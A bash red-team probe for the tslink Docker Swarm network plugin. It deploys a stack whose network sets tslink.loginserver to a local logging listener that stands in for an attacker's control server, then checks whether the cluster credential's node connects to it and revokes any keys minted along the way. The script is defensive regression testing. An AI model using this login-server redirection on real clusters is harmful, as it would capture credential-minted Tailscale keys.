#!/bin/bash
# Guards: G4
# Testbed: tn
# Needs: the cluster credential (oauth-client.secret) on every node
# Attacker: A3, the author of a stack file that passed review.
# Assumes: E1, E2, E3, E4, E8
# Attack: a stack network on the cluster credential with tslink.loginserver pointing at a
#   listener on the manager: stack tslink-test-callee (the stack whose tag the credential may
#   mint), its network tagged tag:tslink-test-callee. Two ways through: the network takes the
#   task (an endpoint of the stack appears), and the task's tailscaled connects to the
#   listener. The listener only logs requests: a control server of the attacker's would answer
#   the first one and receive the key the credential minted in the next.
# Control: v0.3.4, which takes tslink.loginserver from any network, on every node. Teardown: the
#   tree under test (TSLINK_REDTEAM_REF, default WT, the working tree) on every node. In every
#   run, the keys with the stack's tag minted since the probe started are revoked as soon as
#   the listener hears from the task, and after each attempt.
# This probe FAILS on a tree that still takes tslink.loginserver: it passes once the login
# server is the plugin setting TSLINK_LOGIN_SERVER and a network with the option is refused.
# shellcheck disable=SC2329,SC2119 # attacks and controls run through lib.sh's eval
set -uo pipefail
# shellcheck source=../tn.sh
. "$(dirname "$0")/../tn.sh" 2>/dev/null || {
	echo "SKIPPED: a probe of the Swarm bed (tn)"
	exit 3
}
# shellcheck source=../lib.sh
. "$(dirname "$0")/../lib.sh"
STACK=$TN_BASE-callee
REF=${TSLINK_REDTEAM_REF:-WT}
PORT=18443
tn_stack_exists "$STACK" && tn_error "a stack $STACK is deployed: remove it first"
for n in $("$C/nodes"); do
	tn_s "$n" "test -s $TN_DATA/oauth-client.secret" || tn_error "$n has no cluster credential"
done
addr=$(tn_s "$M" "docker info --format '{{.Swarm.NodeAddr}}'")
[ -n "$addr" ] || tn_error "no swarm address of $M"
# The listener: logs each request's line, answers 404
tn_s "$M" "rm -f /root/rt-listener.log; nohup python3 -u -c 'import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(self.client_address[0], self.requestline, flush=True)
        self.send_error(404)
    do_POST = do_GET
http.server.ThreadingHTTPServer((sys.argv[1], int(sys.argv[2])), H).serve_forever()' \
	$addr $PORT >>/root/rt-listener.log 2>/dev/null </dev/null & echo \$! >/root/rt-listener.pid"
tn_on_exit "tn_s $M 'kill \$(cat /root/rt-listener.pid) 2>/dev/null; rm -f /root/rt-listener.pid /root/rt-listener.log'"
tn_on_exit "stack_rm $STACK"
sleep 2
tn_s "$M" "curl -s -o /dev/null http://$addr:$PORT/rt-self; grep -q rt-self /root/rt-listener.log" ||
	tn_error "the listener on $addr:$PORT does not answer"

LEGACY=""
SINCE=$(now)
# heard: whether the listener heard from the task; if so, the key the
# credential minted for it is revoked at once
heard() {
	tn_s "$M" "grep -v rt-self /root/rt-listener.log | grep -q ." || return 1
	revoke_minted
	return 0
}
has_endpoint() { [ -n "$(tn_states "$STACK")" ]; }
# revoke_minted: deletes the keys with the stack's tag created since SINCE,
# whichever OAuth client minted them (all=true), counting them in REVOKED
REVOKED=0
revoke_minted() {
	local id
	for id in $("$C/tsapi" GET "/tailnet/$TN/keys?all=true" | jq -r '.keys[].id'); do
		"$C/tsapi" GET "/tailnet/$TN/keys/$id" |
			jq -e --arg since "$SINCE" --arg t "$T-callee" \
				'.created > $since and any(.capabilities.devices.create.tags[]?; . == $t)' >/dev/null &&
			"$C/tsapi" DELETE "/tailnet/$TN/keys/$id" >/dev/null && echo "revoked key $id" &&
			REVOKED=$((REVOKED + 1))
	done
}
# deployed CHECK: deploys the stack, waits up to 120 s for CHECK, removes it
deployed() {
	local out ok=1
	# Truncated in place: the listener appends to this file, and a new one (sed -i) would leave
	# it writing to the old, unlinked one
	tn_s "$M" ": >/root/rt-listener.log"
	out=$(
		tn_deploy "$STACK" - 2>&1 <<EOF
services:
  client:
    image: alpine:3.23
    command: ["sh","-c","while :; do sleep 3600; done"]
    networks: [tailnet]
networks:
  tailnet:
    driver: tslink:latest
    driver_opts:
      com.docker.network.driver.mtu: "\${TSLINK_TEST_MTU:-1450}"
      tslink.tags: \${TSLINK_TEST_TAG:-tag:tslink-test}-callee
      tslink.loginserver: http://$addr:$PORT
EOF
	)
	echo "deploy: $(tr '\n' ' ' <<<"$out")"
	wait_for 120 "$1" && ok=0
	revoke_minted
	echo "stack $STACK: $(tn_states "$STACK" | head -n 1)"
	echo "listener: $(tn_s "$M" "grep -vc rt-self /root/rt-listener.log") requests"
	stack_rm "$STACK"
	return "$ok"
}
legacy() {
	LEGACY=1
	REVOKED=0
	"$C/install-plugin.sh" v0.3.4 >/dev/null 2>&1 || echo "NOTE: could not install v0.3.4"
}
current() {
	[ -z "$LEGACY" ] || [ "$REVOKED" -gt 0 ] ||
		echo "NOTE: the control revoked no key: none with $T-callee was minted since $SINCE, or none is listed"
	"$C/install-plugin.sh" "$REF" >/dev/null 2>&1 || echo "NOTE: could not install $REF"
	LEGACY=""
}
restore_plugin() { [ -z "$LEGACY" ] || current; }
tn_on_exit restore_plugin

probe_group "a stack's own login server" legacy current 0
probe G4 "a stack network with tslink.loginserver takes a task on the cluster credential" deployed has_endpoint
probe G4 "the cluster credential's node logs in to the stack's login server" deployed heard
run_probes
probe_exit
